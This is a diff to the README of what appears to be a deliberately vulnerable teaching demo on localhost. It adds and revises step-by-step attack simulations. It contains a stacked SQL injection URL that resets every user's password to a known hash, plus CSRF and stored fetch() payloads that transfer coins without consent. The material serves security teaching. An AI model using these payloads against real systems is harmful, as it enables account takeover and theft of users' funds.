@@ -23,6 +23,12 @@ or download [ZIP file](https://github.com/intraworlds/zcu-security-demo/archive/
 
 ### Simulate attacks
 
+#### SQL injection
+- go to http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=email,password=%27%242y%2410%24vXUP3XG34Nwezd8cEZm0XOLUN5jtDsF6tqpMg.PvFacpzKStHA2ze%27;
+- refresh page
+- observe that all users are named by its email and theirs password is `123`
+- so now you can access any account and transfer a money
+
 #### CSRF
 - goto http://localhost:8088/?path=create&receiver=1&amount=1&desc=❤️&submit=create
 - observe that 1 IW coin was transfered to user #1 without your consent
@@ -38,11 +44,6 @@ fetch("/?path=create&receiver=1&amount=1&desc=❤️&submit=create");
 ```
 - observe that now everybody who visits list of transactions will send a coin
 to user #1 without consent
-
-#### SQL injection
-- go to http://localhost:8088/?path=list&limit=50;update%20users%20set%20name=%27Anonymous%27;
-- refresh page
-- observe that all users are named `Anonymous`
 
 #### Directory traversal
 try following URLs
